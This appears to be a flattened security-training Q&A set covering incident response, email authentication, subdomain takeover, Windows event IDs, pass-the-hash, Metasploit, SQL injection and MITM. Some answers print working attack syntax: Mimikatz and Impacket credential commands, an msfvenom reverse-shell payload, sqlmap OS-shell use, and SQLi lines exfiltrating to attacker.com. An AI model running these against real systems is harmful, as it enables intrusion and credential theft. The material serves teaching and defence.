Phase 3: Containment, Eradication, and Recovery: Containment: stop spread without destroying evidence; isolate compromised systems (network isolation or EDR isolation command); change compromised credentials; block known attacker infrastructure (firewall rules, proxy blocks); short-term vs long-term containment strategies. Eradication: remove attacker presence; delete malware files; remove persistence mechanisms (registry keys, scheduled tasks, services, web shells); remove attacker accounts; close exploited vulnerability or apply compensating control. Recovery: restore systems from clean backup; verify systems clean before returning to production; enhanced monitoring during recovery; staged return to production; confirm normal operations resumed. Phase 4: Post-Incident Activity: lessons learned meeting 2 weeks after resolution; root cause analysis; what detection gap allowed initial compromise? What could have shortened dwell time? Update IR plan, detection rules, security controls; regulatory reporting (GDPR, state breach laws, SEC); executive report; close incident ticket. Key metrics: Mean Time to Detect (MTTD); Mean Time to Respond (MTTR); Mean Time to Contain (MTTC); dwell time (time from compromise to detection).
How does DKIM, DMARC, and SPF protect email?

Email authentication trio: SPF, DKIM, DMARC work together to prevent email spoofing and phishing. SPF (Sender Policy Framework, RFC 7208): DNS TXT record lists authorised sending mail servers for domain; receiving server checks if sending IP is in SPF record for From domain; example: v=spf1 ip4:203.0.113.10 include:sendgrid.net include:mailchimp.com -all; mechanisms: ip4/ip6 (specific IP), include (delegate to third-party SPF record), a (domain A record), mx (domain MX records), all (catch-all: -all = fail, ~all = softfail, +all = pass all -- bad); limitation: SPF checks envelope sender (MAIL FROM), not header From (what user sees); attacker can pass SPF with different MAIL FROM while spoofing display From. DKIM (DomainKeys Identified Mail, RFC 6376): cryptographic signature on email headers and body; sender signs with private key; public key published in DNS TXT record at selector._domainkey.domain.com; signature in DKIM-Signature header; receiving server fetches public key, validates signature; proves email content not modified in transit and originated from server with private key; signing key selector allows multiple keys (key rotation); limitation: DKIM alone does not prevent spoofing of From header in unsigned domains. DMARC (Domain-based Message Authentication Reporting and Conformance, RFC 7489): policy record in DNS at _dmarc.domain.com; specifies: what to do when SPF or DKIM fails (p=none monitor only, p=quarantine send to spam, p=reject block delivery); alignment requirement (From header domain must match SPF or DKIM domain); reporting (rua=mailto:dmarc-agg@domain.com for aggregate reports; ruf= for forensic reports); protects against From header spoofing (SPF and DKIM alignment must be with displayed From domain). Deployment strategy: start with DMARC p=none and rua reporting; analyse reports (identify all legitimate senders including email marketing, CRM, HR systems); ensure all legitimate senders have SPF and DKIM configured; move to p=quarantine then p=reject; BIMI (Brand Indicators for Message Identification): attach company logo to authenticated email; requires DMARC p=quarantine or p=reject plus VMC (Verified Mark Certificate).
What is subdomain takeover and how do you find and exploit it?

Subdomain takeover: attacker registers or controls the backend resource a subdomain points to; attacker serves content from legitimate subdomain. How it happens: company creates DNS CNAME: staging.victim.com CNAME victim.azurewebsites.net; company deletes Azure Web App but forgets to remove CNAME; victim.azurewebsites.net is now unregistered and available; attacker registers victim.azurewebsites.net on Azure; all traffic to staging.victim.com goes to attacker-controlled content; attacker serves phishing page from legitimate staging.victim.com subdomain. Common vulnerable services: GitHub Pages: CNAME pointing to username.github.io; user deletes GitHub Pages; GitHub Pages subdomain available for registration; Azure Web Apps, Blob Storage; Netlify; Heroku; Fastly; Shopify (CNAME pointing to mystore.myshopify.com); S3 static website hosting (CNAME pointing to bucket.s3.amazonaws.com; bucket deleted and available). Finding vulnerable subdomains: enumerate all subdomains: subfinder, amass, crt.sh, assetfinder; resolve each subdomain; check for CNAME records: dig staging.victim.com CNAME; look for dangling CNAMEs (CNAME resolves to non-existent service); check response: NXDOMAIN for the CNAME target; service-specific error messages (There is not a GitHub Pages site here; No Such Bucket; Heroku: No such app). Tool: subjack, SubOver (automated subdomain takeover checker); nuclei with subdomain-takeover templates. Exploitation: claim the unclaimed resource (register GitHub Pages, create Azure Web App, claim S3 bucket -- same name as DNS target); deploy content; now serve from victim.com subdomain. Impact: phishing from trusted subdomain; bypass SOP (Same-Origin Policy) if cookies scoped to.victim.com (can read cookies from attacker-controlled subdomain); SameSite=None cookies accessible; malware distribution from trusted domain; CSP bypass if staging.victim.com whitelisted in parent domain CSP. Remediation: remove DNS records when decommissioning cloud resources; automate: track all DNS records; alert when CNAME target becomes unavailable; use CNAME reference management; subdomain monitoring (daily check for dangling CNAMEs).
What is a session fixation attack?

Session fixation: attacker fixes (pre-sets) a valid session ID before authentication; victim authenticates; attacker uses the same session ID to access victim authenticated session. How it works: (1) Attacker obtains valid session ID (sends unauthenticated request to site, receives session ID: SESSIONID=abc123); (2) Attacker tricks victim into using the same session ID: URL parameter: http://victim.com/login?PHPSESSID=abc123; if application uses URL session IDs (bad practice), victim visits link with attacker session ID; cookie injection: if attacker can set cookies (same domain/parent domain, XSS, or HTTP injection): set SESSIONID=abc123 cookie for victim; (3) Victim logs in at victim.com (using attacker-set session ID abc123); server associates abc123 session; (4) Attacker uses SESSIONID=abc123 to access site -- now authenticated as victim. Attack conditions: application must: accept session ID from URL parameter or allow attacker to set cookie; not regenerate session ID after login (root cause). Mitigation: regenerate session ID after successful authentication (most important fix); do not accept session IDs from URL parameters; httpOnly cookie flag (JavaScript cannot read cookie, reduces XSS cookie theft but not fixation); Secure flag (HTTPS only); same-site strict (cookie not sent with cross-site requests); validate session ID is associated with current user context. PHP example: after login: session_regenerate_id(true) (delete old session, create new session ID with same data); Java (Spring): SessionManagementConfigurer.sessionFixation().changeSessionId() or newSession(). Difference from session hijacking: session hijacking: attacker steals existing authenticated session ID (after victim already logged in); session fixation: attacker sets session ID before victim logs in; both result in attacker accessing victim session. Testing: create new unauthenticated session; note session ID; complete authentication; check if session ID changed; if same before and after authentication: vulnerable to session fixation.
What are Windows Event Log IDs security analysts should monitor?

Critical Windows Event Log IDs for security monitoring: Authentication: 4624 Account Logon Success: logon type (2=interactive, 3=network, 5=service, 7=unlock, 8=NetworkCleartext-bad, 9=NewCredentials, 10=RemoteInteractive RDP, 11=CachedInteractive); 4625 Account Logon Failure: includes failure reason code (0xC000006A wrong password, 0xC0000064 no such user, 0xC0000234 account locked); 4648 Logon with Explicit Credentials (RunAs, pass-the-hash indicator when NTLM); 4634/4647 Logoff; 4672 Special Privileges Assigned (admin logon). Account management: 4720 User Account Created; 4722 User Account Enabled; 4723/4724 Password Change/Reset; 4726 User Account Deleted; 4728/4732/4756 Member Added to Security/Local/Universal Group (4728 to global group = high privilege group addition); 4756 Member added to Universal Group; 4735 Security-Enabled Group Changed. Object access (must enable audit policy): 4663 Object Access (file, registry -- requires SACL on object); 4688 Process Creation (enable command-line auditing -- critical for detecting malicious execution). Policy/System: 4698 Scheduled Task Created; 4702 Scheduled Task Updated; 4697 Service Installed; 7045 New Service Installed (System log); 4719 System Audit Policy Changed; 4902 Per-user audit policy table created. Kerberos: 4768 TGT Request (Kerberos authentication); 4769 TGS Ticket Request (watch for RC4 encryption = kerberoasting indicator); 4771 Kerberos Pre-authentication Failed; 4776 NTLM Authentication. Domain Controller specific: 4741 Computer Account Created; 4742 Computer Account Changed; 4768/4769 at DC = Kerberos auth traffic. PowerShell: 4104 Script Block Logging (PowerShell code executed -- most important PS log); 4103 Module Logging; 400/500/600 PowerShell engine lifecycle. Sysmon (supplemental): Event 1 Process Creation (with full command line and hashes); Event 3 Network Connection; Event 7 Image Loaded (DLL loaded -- detect DLL injection); Event 8 CreateRemoteThread (process injection); Event 10 ProcessAccess (LSASS access detection for credential dumping); Event 11 FileCreate; Event 13 Registry Value Set; Event 19/20/21 WMI activity (persistence). Alert priorities: 4728 Domain Admins group addition (P1); 4697 unexpected service (P2); 4698 suspicious scheduled task (P2); 4688 cmd/powershell from unusual parent (P2); 4625 account lockout threshold breach (P3).
What is a supply chain attack and how does it work?

Supply chain attack: attacker compromises software, hardware, or service provider to reach target organisations that trust and use that provider. Software supply chain: compromise software build pipeline; inject malicious code into legitimate software updates delivered to customers; SolarWinds attack (2020): attackers (SVR/Cozy Bear) compromised SolarWinds Orion build system; trojanised update distributed to 18,000 organisations including US government agencies, Fortune 500; SUNBURST backdoor activated months after install (evaded detection); XZ Utils backdoor (2024): sophisticated multi-year social engineering; attacker gradually became trusted contributor to XZ Utils compression library; inserted backdoor into build process targeting OpenSSH on systemd systems. Dependency confusion: attacker publishes malicious package to public npm/PyPI/RubyGems with same name as internal private package but higher version; pip install myinternal-lib resolves to attacker package (public repos checked first); runs malicious code on developer or CI/CD machines. Typosquatting: publish package with name similar to popular package (reqests vs requests, colourama vs colorama); developers install by typo. npm/PyPI supply chain: event-stream (npm, 2018): new malicious maintainer added code to steal cryptocurrency wallet credentials; colors/faker (npm, 2022): maintainer intentionally corrupted own packages. Hardware supply chain: counterfeit components; tampered hardware at manufacturer or during shipping; firmware implants; Bloomberg SuperMicro claim (2018) regarding Chinese hardware implants (disputed). Open source maintainer accounts: compromise maintainer account (phishing, credential stuffing); push malicious update; multi-factor authentication on package registries reduces risk. Mitigation: dependency pinning (pin exact version hashes not just semver ranges; lock files); SBOM (Software Bill of Materials); build reproducibility (deterministic builds allowing independent verification); private package registry (no resolution from public repos first); dependency confusion prevention: namespace all internal packages; internal registry configured as authoritative; code signing for packages and binaries; multi-factor authentication for package maintainer accounts; monitor for unusual package updates or dependency changes; least privilege for build systems; vendor security questionnaires.
What is Pass the Hash and Pass the Ticket?

Lateral movement techniques exploiting Windows authentication protocols. Pass the Hash (PtH): authenticate to Windows services using NTLM hash without knowing plaintext password; NTLM authentication does not require plaintext; server sends challenge, client responds with NTLM hash of password; attacker who obtains hash (via Mimikatz sekurlsa::logonpasswords from LSASS, via secretsdump.py, or from SAM database) can authenticate to any service using NTLM without cracking hash. Tools: Mimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe (spawns process with injected credentials); Impacket: smbclient.py, psexec.py, wmiexec.py with -hashes LM:NT parameter; crackmapexec: crackmapexec smb TARGET -u admin -H NTLM_HASH. Scope: works for local and domain accounts with NTLM; cannot pass hash for Kerberos-only authentication. Mitigation: Windows Defender Credential Guard (VBS protects LSASS -- Mimikatz cannot extract hashes from protected LSASS); disable NTLM where possible (Kerberos preferred); unique local admin passwords (LAPS); disable default admin share ($); Protected Users security group (domain members cannot use NTLM). Pass the Ticket (PtT): steal Kerberos TGT or TGS from memory; use ticket without needing password or hash; more powerful than PtH (works for Kerberos-authenticated services). Ticket extraction: Mimikatz: sekurlsa::tickets /export (extracts all tickets from memory as.kirbi files); Rubeus.exe dump (extracts base64-encoded tickets); Ticket injection: Mimikatz: kerberos::ptt ticket.kirbi (inject ticket into current session); Rubeus.exe ptt /ticket:BASE64 (inject ticket). Golden Ticket: forge TGT using krbtgt account hash; valid for any service in domain; persistent (valid 10 years by default); requires domain compromise (DCSync or domain controller access) to obtain krbtgt hash; Mimikatz: kerberos::golden /user:Administrator /domain:corp /sid:S-1-5-21-... /krbtgt:HASH /ptt. Silver Ticket: forge TGS for specific service using service account hash; limited to that service; quieter than Golden Ticket (no DC interaction); requires only service account hash (not krbtgt). Detection: 4769 Event ID with unusual Ticket Encryption Type; kerberros tickets with unusually long expiration; tickets for non-existent users; tickets from non-DC sources; CrowdStrike and EDRs detect Mimikatz memory access patterns.
What is Metasploit and how is it used in penetration testing?

Metasploit Framework: most widely used open-source penetration testing platform; Ruby-based; provides exploits, payloads, auxiliary modules, encoders, and post-exploitation modules. Components: Exploits: code that takes advantage of specific vulnerability (EternalBlue for MS17-010, Bluekeep for CVE-2019-0708); Payloads: code executed on target after exploitation (reverse_tcp, meterpreter, bind_tcp, exec); Auxiliary: scanners, fuzzers, crawlers, brute-force (not exploits -- no payload); Post: post-exploitation modules (privilege escalation, persistence, dumping credentials, pivoting); Encoders: encode payload to evade AV signature detection; Evasion: more advanced AV evasion; NOP Sleds: padding. msfconsole: primary interface; commands: search ms17 (search modules by CVE or keyword); use exploit/windows/smb/ms17_010_eternalblue (select module); show options (list required/optional parameters); set RHOSTS 192.168.1.10 (set target); set LHOST 192.168.1.100 (set local host for reverse connection); run or exploit (execute); sessions -l (list active sessions); sessions -i 1 (interact with session). Meterpreter: advanced in-memory payload; does not write to disk; extends: sysinfo, getuid, ps, migrate (move to another process), hashdump (dump NTLM hashes), getsystem (privilege escalation attempts), upload/download (file transfer), shell (drop to OS shell), keyscan_start/dump, screenshot, load kiwi (Mimikatz integration in meterpreter). Pivoting: use compromised host as tunnel to reach other segments; route add 10.0.0.0/24 SESSION_ID (add route through meterpreter session); auxiliary/server/socks_proxy (create SOCKS4/5 proxy through session; proxychains). MSF database: db_nmap (nmap scan results stored in DB); hosts (list discovered hosts); services (list discovered services); vulns (list confirmed vulnerabilities). msfvenom: standalone payload generator (separate from msfconsole): msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe; generates payload files for delivery via phishing, USB, web. Metasploit Pro (commercial): GUI, automation, social engineering toolkit, nexpose integration.
What is DDoS and how do you defend against it?

DDoS (Distributed Denial of Service): overwhelm target with traffic from multiple sources (botnet); make service unavailable to legitimate users. Attack types: Volumetric: flood network bandwidth; UDP flood (amplification); ICMP flood (ping flood); DNS amplification (send DNS query with spoofed source=victim to open resolver; response 50-100x larger than query; amplification factor 50x; 10Gbps query traffic = 500Gbps attack traffic); NTP amplification (monlist command returns up to 600 IP addresses; amplification 4000x); SSDP amplification (UPnP; 30x amplification); Mirai botnet: 620Gbps Krebs on Security attack (2016); 1.35Tbps Memcached attack (2018). Protocol attacks: exploit protocol weakness; SYN flood: TCP three-way handshake; attacker sends many SYN packets with spoofed source IP; target allocates resources for half-open connections; resources exhausted; SYN cookies mitigate; fragmented packet attacks; Ping of Death (oversized ICMP packet). Application layer (Layer 7): HTTP flood; slow attacks (Slowloris: open many connections, send data slowly, keep connections open forever; exhausts connection pool; SSL renegotiation attacks); appear legitimate at network level; harder to distinguish from real users; lower traffic volume but more effective. Defenses: Cloud-based DDoS protection: Cloudflare DDoS mitigation; Akamai Kona Site Defender; AWS Shield (Standard: free, Advanced: $3000/month SLA); Akamai Prolexic; scrubbing centres: traffic routed through cleaning centre; attack traffic scrubbed; clean traffic forwarded; network infrastructure: anycast routing (traffic distributed across many PoPs); BGP blackholing (black hole attack traffic at upstream provider level); SYN cookies: stateless SYN response -- no state allocated until handshake completes; connection rate limiting; IP reputation blocking; Rate limiting and WAF: application layer DDoS protection; challenge suspicious IPs (CAPTCHA, JavaScript challenge); block IPs below threshold; Cloudflare Under Attack Mode. ISP-level: upstream providers absorb or null-route attack traffic; contact ISP during attack for assistance; Flowspec BGP rules to drop attack packets at ISP level.
What is penetration testing scope and rules of engagement?

Scope and rules of engagement (ROE): critical documentation establishing legal boundaries and expectations for penetration testing. Why essential: unauthorised access to computer systems is criminal (Computer Fraud and Abuse Act, UK Computer Misuse Act, similar laws worldwide); clear scope documentation protects tester ; defines what is and is not authorised; establishes liability. Scope document includes: target systems: IP ranges, domains, application URLs; explicit inclusions (these systems are in scope); explicit exclusions (these systems are out of scope -- third-party hosting, customer-facing if availability critical, specific critical servers); testing type: web application only, network penetration test, social engineering, physical, red team; authorised techniques: allowed (port scanning, vulnerability scanning, exploitation, phishing tests, physical access testing); prohibited (DDoS, destructive attacks, accessing data beyond proof of exploitation, pivoting to out-of-scope systems); authorised personnel: who is authorised to conduct testing (specific tester names); who can authorise emergency stop. Rules of Engagement document: testing windows: business hours only, 24/7, or specific maintenance windows for potentially disruptive tests; emergency contact: if tester discovers active breach or causes unintended disruption: who to call immediately (24/7 emergency contact); escalation path; safe harbour / authorisation letter: written document signed by appropriate authority (CISO, CTO, CEO or board-level for comprehensive testing); tester carries during testing (if stopped by police or security guard); data handling: how to handle sensitive data discovered during testing (do not exfiltrate personally identifiable info beyond proof); notify if sensitive data discovered; reporting requirements: interim findings (critical vulnerabilities reported immediately vs. end of engagement); final report format and recipients; retesting: is follow-up retesting of remediated findings included? Scope creep: document what to do when pentest reveals adjacent out-of-scope system that appears vulnerable (notify client, do not test without explicit approval). Contracts: service agreement, SOW (Statement of Work), NDA (Non-Disclosure Agreement), indemnification clauses -- legal review recommended for high-value engagements.
What is SIEM log correlation and how do you write detection rules?

SIEM detection rules: define conditions in collected log data that indicate security threats; translate threat hypothesis into query. Rule writing process: start with threat hypothesis (hypothesis: attacker performs brute force then succeeds = credential stuffing or brute force success); identify data sources (Windows auth events, AD events, web auth logs); identify relevant field values (Event ID 4625 for failures, 4624 success; specific logon types); define correlation logic (5+ failures from same source IP within 5 minutes followed by success); implement as SIEM query. Splunk SPL example: index=winauth EventCode=4625 | bin _time span=5m | stats count as failures by src_ip _time | where failures > 4 | join src_ip [search index=winauth EventCode=4624 | fields src_ip, user] | table src_ip, user, failures; alert trigger: 1 result or more. Sigma (universal rule format): title: Brute Force with Successful Logon; detection: selection_fail: EventID: 4625; filter: EventID: 4624; followed: selection_fail; within: 5m; threshold: count(selection_fail) >= 5; condition: filter and followed. Sigma converted to Splunk, Elastic, Microsoft Sentinel, QRadar, Chronicle. Rule fields: True positive rate (what percentage of alerts are real): measure by reviewing 50 alerts; False positive rate: percentage of alerts that are benign; Severity: Critical/High/Medium/Low based on impact if true positive; MITRE ATT&CK mapping: which technique does this detect (T1110.003 Password Spraying). Common detection patterns: threshold: count events exceeding threshold in time window (failed logins, new accounts created, large file access); correlation: event A followed by event B (suspicious recon then lateral movement); whitelist exceptions: alert on event unless from known-good source (excluded vulnerability scanner); statistical baseline deviation: today vs 30-day baseline (10x deviation alert); rare occurrence: event seen fewer than 3 times in 30 days. Alert tuning: for each alert type: review 20 recent alerts (true positive? false positive?); add exceptions for known FP patterns; adjust thresholds; document expected FP sources; aim for >80% precision before declaring rule production-ready.
What is cloud security posture management (CSPM) versus CIEM?

CSPM vs CIEM: both cloud security disciplines; different focus areas; complementary. CSPM (Cloud Security Posture Management): focuses on configuration of cloud resources; identifies and remediates misconfigurations; checks if resources are correctly configured per security best practices; example findings: S3 bucket publicly accessible; RDS database allows 0.0.0.0/0; CloudTrail not enabled; EC2 instance with SSH open to internet; VPC flow logs disabled; root account used recently; MFA not enabled on IAM users. Frameworks checked: CIS Benchmarks for AWS/Azure/GCP; NIST 800-53; PCI DSS; SOC 2; ISO 27001. Tools: Prisma Cloud (Palo Alto), Wiz, Orca Security, Lacework, Bridgecrew, Microsoft Defender for Cloud, AWS Security Hub. CIEM (Cloud Infrastructure Entitlement Management): focuses on identities and their permissions in cloud; analyses what human and machine identities can do; identifies over-privileged identities; maps actual permissions vs used permissions; example findings: EC2 instance role has AdministratorAccess but only uses S3:GetObject; 50 IAM users have IAM:* permissions; external IAM roles trusted by accounts; service accounts with excessive cross-account access; privilege escalation paths (combination of permissions that could be chained to gain admin); stale identities (accounts not used in 180 days). Tools: Ermetic (acquired by Tenable), CloudKnox (acquired by Microsoft -- Microsoft Entra Permissions Management), Authomize, Sonrai Security, Britive. Key difference: CSPM = what is configured; CIEM = who can do what; CSPM finds misconfigured S3 bucket; CIEM finds which identity has access to read all S3 buckets even if not misconfigured; both needed for comprehensive cloud security. Combined platforms: Wiz (CSPM + CIEM); Prisma Cloud (CSPM + CIEM); Microsoft Defender for Cloud (CSPM) + Entra Permissions Management (CIEM). CIEM findings feed into attack path analysis: Wiz and Prisma Cloud show: if this EC2 is compromised, what blast radius? (trace all permissions available to compromised instance).
What is the difference between penetration testing and vulnerability assessment?

Penetration testing vs vulnerability assessment: two distinct but complementary security services. Vulnerability assessment: identifies and catalogues known vulnerabilities in systems; automated scanning supplemented by manual verification; scope: typically all in-scope systems; depth: broad but shallow; does not exploit vulnerabilities; only identifies them (theoretical risk); output: list of vulnerabilities with CVSS scores and remediation guidance; duration: 1-5 days typically; cost: lower (more automated); frequency: quarterly or monthly; tools: Nessus, Qualys, Rapid7 InsightVM, OpenVAS; good for: maintaining ongoing awareness of vulnerability inventory, compliance (PCI DSS requires quarterly scanning), prioritising patching. Penetration testing: actively exploits vulnerabilities to demonstrate real-world impact; manual attacker simulation; chain vulnerabilities (low + medium = critical impact); discover business logic flaws automation misses; scope: defined systems; depth: deep (chase compromise path to conclusion); output: exploited vulnerabilities with proof, realistic attack chains, business impact; duration: 1-4 weeks typically; cost: significantly higher; frequency: annually or after significant changes; good for: demonstrating real-world risk to stakeholders, testing defence controls (SIEM, EDR), validating security architecture, compliance (PCI DSS 11.3: annual pentest). What pentest finds that VA misses: business logic vulnerabilities (no CVE, no scanner pattern); chained vulnerabilities (VA reports each separately; pentest shows how they combine); authentication and authorisation bypasses; contextual risk (publicly known server = low; same server in DMZ with path to cardholder data = critical). Compliance perspective: PCI DSS requires both: quarterly VA scanning (ASV -- Approved Scanning Vendor -- for external; internal tool for internal) AND annual penetration test; ISO 27001 recommends regular pentesting; HIPAA does not explicitly require pentest but periodic security testing; SOC 2 expects some form of regular security testing. Best practice: run VA for ongoing visibility; pentest to deeply validate security posture and simulate realistic attack paths.
What is social engineering and its types?

Social engineering: manipulate people rather than systems; exploit human psychology; bypass technical controls through human vulnerability. Why effective: humans are often weakest link; technical controls can be perfect but human errors defeat them; employees trained on phishing still click; urgency, authority, and fear override critical thinking. Types: Phishing: deceptive email; impersonate trusted entity (bank, IT, CEO, HR); request credentials, click link, open attachment; easy to scale (millions of emails); success rate even with training: 2-5%. Spearphishing: targeted phishing; personalised to specific individual; uses OSINT (name, role, recent project, colleague names, writing style); much higher success rate than generic phishing; CEO fraud / BEC uses spearphishing. Vishing (voice phishing): phone call pretending to be IT support, bank fraud team, government; social engineering over phone; harder to resist (real-time pressure, cannot delay to think); successful for credential theft and wire fraud. Smishing (SMS phishing): text message with malicious link; bank account verification, package delivery, government benefit; mobile users less security aware on phone than computer. Whaling: targeting senior executives (whale = big fish); fake board member, fake legal demand, fake acquisition notice; CFO authorising wire transfer; C-suite targeted for high-value fraud. BEC (Business Email Compromise): attacker compromises or spoofs executive email; redirects wire transfers to attacker account; requests W-2 tax forms for all employees; change vendor bank account details; billion-dollar industry; FBI Internet Crime Report: $2.7B BEC losses in 2022. Pretexting: create elaborate fictional scenario (fake IT auditor, fake vendor, fake new employee); build trust over time before exploitation. Baiting: leave infected USB in parking lot; curiosity causes victim to plug in; malware auto-runs; tailgating: follow authorised person through secure door (badge-required); social obligation to hold door; piggyback into secure areas. Quid pro quo: offer something in exchange (fake IT support calls offering to fix computer; require login credentials to help). Defences: security awareness training; phishing simulation (measure and improve click rates); clear processes for wire transfer requests (second approval channel, phone verification to known number); verification procedures (call back using number from corporate directory, not provided by caller); never trust without verifying identity through independent channel.
How do you perform SQL injection in a penetration test?

SQLi penetration testing: identify and exploit SQL injection vulnerabilities in web applications. Detection: inject single quote (') into all user-input fields (URL parameters, form fields, headers, cookies); observe: database error (reveals DB type and query structure), behaviour change (authentication bypass, different data returned), time delay (blind SQLi); test all input vectors systematically. Tools: sqlmap: automated SQLi detection and exploitation; sqlmap -u http://target.com/page?id=1 (test URL parameter); sqlmap -u URL --forms (test all form fields); sqlmap -u URL -p id (specify parameter); sqlmap -u URL --dbs (enumerate databases); sqlmap -u URL -D dbname --tables (enumerate tables); sqlmap -u URL -D dbname -T tablename --dump (dump table); sqlmap -u URL --os-shell (attempt OS command execution if DB user has FILE privilege). Manual exploitation: In-band SQLi: results returned in response; UNION-based: ' UNION SELECT username,password,NULL FROM users-- (append results from secondary query; must match column count and types; find column count: ' ORDER BY 1-- increasing until error; identify string column: ' UNION SELECT NULL,NULL,NULL-- replace NULLs with string literals until one works); Error-based: extract data from error messages (MySQL: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--). Blind SQLi: no results in response; Boolean-based: ' AND 1=1-- (true condition = different response than ' AND 1=2--); extract data bit by bit: ' AND SUBSTRING(version(),1,1)='5'--; Time-based: ' AND SLEEP(5)--; measure response time to infer true/false. Out-of-band SQLi: extract data via DNS or HTTP: MySQL: ' AND LOAD_FILE(CONCAT(//,(SELECT version()),.,attacker.com/a))--; useful when response and time are indistinguishable. OS command execution: MySQL with FILE privilege and INTO OUTFILE; MSSQL with xp_cmdshell: '; EXEC xp_cmdshell 'whoami'--; PostgreSQL COPY TO/FROM: COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'. Report: document each injection point found; provide proof (screenshot of data returned or error); note database type and version; escalate to OS compromise if possible to demonstrate full impact; provide parameterised query fix for each finding.
What is a man-in-the-middle (MITM) attack?

MITM (Man-in-the-Middle) attack: attacker positions between two communicating parties; intercepts, possibly modifies, communication; both parties believe they are communicating directly. Techniques: ARP spoofing: ARP (Address Resolution Protocol) maps IP to MAC address on LAN; no authentication; attacker sends gratuitous ARP replies: I am 192.168.1.1 (gateway) at MAC AA:BB:CC:DD:EE:FF (attacker MAC); LAN hosts update ARP cache; send traffic to attacker instead of gateway; attacker forwards to real gateway (transparent MITM); tools: arpspoof, ettercap, bettercap. DNS spoofing: respond to DNS queries with false IP; redirects all connections for domain to attacker; combined with ARP spoof or rogue DNS server; requires DNS cache poisoning or control of DNS resolver. Rogue Wi-Fi (evil twin): create fake AP with same SSID as legitimate network; stronger signal wins; clients connect; attacker is gateway; intercept all traffic; tools: hostapd-wpe (wireless phishing enterprise -- steals MSCHAPv2 credentials from enterprise Wi-Fi); Airbase-ng. SSL stripping: downgrade HTTPS to HTTP silently; user goes to http://bank.com; MITM intercepts; forwards to https://bank.com (maintains secure connection to server); returns HTTP to victim; victim credentials sent in cleartext; Moxie Marlinspike (2009). Attack flow with bettercap: arp.spoof on; set arp.spoof.targets 192.168.1.0/24; net.sniff on; https.proxy on (SSL MITM with self-signed cert). Detection: ARP spoofing: ARP watch alerts on ARP changes; check arp -a for unexpected MAC-IP mappings; dynamic ARP inspection on switches (enterprise feature); TLS: certificate warnings if cert changed; HSTS (HTTP Strict Transport Security) prevents SSL stripping (browser enforces HTTPS after first visit); certificate pinning prevents cert swap; Wi-Fi: rogue AP detection; 802.1X enterprise authentication prevents open networks; check gateway MAC matches expected. Mitigation: use HTTPS everywhere (Let Encrypt); HSTS preloading; encrypted DNS (DoH/DoT); VPN on untrusted networks; HPKP (deprecated) or certificate pinning; dynamic ARP inspection on switches; 802.1X on enterprise Wi-Fi.
What is the role of threat intelligence in SOC operations?

Threat intelligence in SOC: enhances detection, response, and proactive security using knowledge about threats. How threat intel improves SOC: Indicator-based detection: add known bad IPs, domains, file hashes to SIEM blocklist/watch list; trigger alert when seen in logs; automated IoC ingestion from MISP, ISAC feeds, vendor feeds; alert enrichment: when SIEM fires alert: enrich automatically (what do we know about this IP/domain? VirusTotal score? Known associated malware family? Affected region? Known threat actor?); reduces time to triage. Proactive threat hunting: if intel indicates APT group targeting your sector: hunt for their specific TTPs in your environment; search for known IoCs from APT reports; develop hunt hypotheses from group techniques. Threat-informed detection development: Intel reports on new ransomware campaign: extract TTPs, write detection rules before IoCs burn; coverage against techniques used by most relevant threat actors. Contextual prioritisation: vulnerability CVE without known exploit = medium priority; same CVE with active exploitation in your sector = critical; threat intel adds context to vulnerability scoring. IR support: during active incident: compare attacker artefacts to threat intel database; identify malware family; look up known C2 indicators; consult reports on group TTPs for anticipated next steps; attribute attack (with appropriate caveats). Strategic intelligence: brief executive team on relevant threat landscape (ransomware groups targeting healthcare; nation-state interest in energy sector); inform security investment decisions; board-level risk communication. Intel sources for SOC: automated feeds: VirusTotal Enterprise, Recorded Future, Mandiant, Crowdstrike Intelligence, Anomali; open source: MISP community, OpenCTI, AlienVault OTX, abuse.ch (Feodo Tracker, MalwareBazaar), SANS DShield, PhishTank; government: CISA, NCSC, FBI Flash Alerts, ENISA; ISAC: sector-specific sharing. Platform: Threat Intelligence Platform (TIP): aggregates multiple feeds; deduplicates; normalises to STIX format; integrates with SIEM for automated IoC enrichment; Anomali ThreatStream, ThreatConnect, EclecticIQ, MISP (open source). Analyst skills: critical evaluation of intel (source reliability, confidence level, timeliness); distinguish tactical IoCs (burn fast) from strategic TTP intel (more durable); avoid confirmation bias (don't over-attribute every attack to most famous APT).
What is vulnerability scanning and how do you interpret results?

Vulnerability scanning: automated assessment of systems for known vulnerabilities; foundation of vulnerability management programme. How scanners work: agent-based: lightweight agent installed on each system; direct access to installed software versions, patches, configuration; most accurate for internal systems; agentless/credentialed: scanner SSHs or uses WMI to authenticate; reads software inventory, patch level, configuration; nearly as accurate as agent. Unauthenticated: no credentials; scans network-accessible services only; version banner detection; identifies potential vulnerabilities from service versions; less accurate (false positives without knowing patch level). Vulnerability assessment process: (1) asset discovery: identify all in-scope systems; (2) credentialed scan: authenticate to all systems; (3) results analysis: review findings; (4) risk prioritisation: CVSS + exploitability + asset criticality + exposure; (5) remediation: patch, mitigate, or accept; (6) rescan: verify remediation; (7) track over time. Interpreting scanner output: severity: Critical/High/Medium/Low/Informational (CVSS 9-10/7-8.9/4-6.9/0.1-3.9/0); CVSS score: base metric (see CVSS entry); VPR (Vulnerability Priority Rating in Tenable): proprietary risk score; incorporates threat intelligence (is this being exploited in the wild?); asset criticality (vulnerability on critical production server vs test server); exploitability (public exploit available?). False positive management: unauthenticated scans have 40-60% false positive rate; credentialed scans 5-10%; always verify findings manually before reporting as confirmed; check version banner vs actual installed version (some apps report old version numbers). Critical findings: known exploited (CISA KEV -- Known Exploited Vulnerabilities catalog -- critical: actively exploited in wild; patch within 2 weeks); Public exploit code available (easily exploitable); Critical CVSS + internet-facing: immediate priority. Tools: Nessus (most popular; comprehensive; vulnerability database updated daily; Tenable.io cloud version); Qualys VMDR (cloud-based; agent and agentless; comprehensive reporting); Rapid7 InsightVM (vulnerability management + threat exposure; AppSec integration); OpenVAS/Greenbone (open source; community edition). Reporting: executive dashboard (total vulnerabilities by severity, trend over time, SLA compliance); technical report (vulnerability details, affected systems, patch available, CVSS, VPR); remediation tickets (Jira integration).
How do you enumerate Active Directory during a penetration test?

